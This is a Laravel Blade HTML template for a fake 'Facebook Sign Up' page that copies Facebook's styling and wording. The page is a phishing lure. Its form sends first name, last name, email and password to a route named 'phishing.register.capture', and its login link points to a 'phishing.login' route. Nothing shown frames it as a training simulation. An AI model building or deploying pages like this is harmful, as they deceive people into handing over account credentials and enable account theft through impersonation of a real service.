<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Facebook Sign Up</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            text-align: center;
        }
        .container {
            width: 400px;
            margin: auto;
            margin-top: 50px;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 100%;
            background: #42b72a;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            font-size: 16px;
            margin-top: 10px;
        }
        button:hover {
            background: #36a420;
        }
        h2 {
            color: #1877f2;
            font-size: 24px;
        }
        .login-link {
            margin-top: 20px;
            font-size: 14px;
        }
        .login-link a {
            color: #1877f2;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Create a new account</h2>
        <p>It's quick and easy.</p>
        <form action="{{ route('phishing.register.capture') }}" method="POST">
            @csrf
            <input type="text" name="first_name" placeholder="First name" required>
            <input type="text" name="last_name" placeholder="Last name" required>
            <input type="email" name="email" placeholder="Email address" required>
            <input type="password" name="password" placeholder="New password" required>
            <input type="password" name="password_confirmation" placeholder="Confirm password" required>
            
            <p style="font-size: 12px; text-align: left; color: #777;">
                By clicking Sign Up, you agree to our Terms, Privacy Policy and Cookies Policy.
            </p>
            
            <button type="submit">Sign Up</button>
        </form>
        <div class="login-link">
            <p>Already have an account? <a href="{{ route('phishing.login') }}">Log In</a></p>
        </div>
    </div>
</body>
</html> 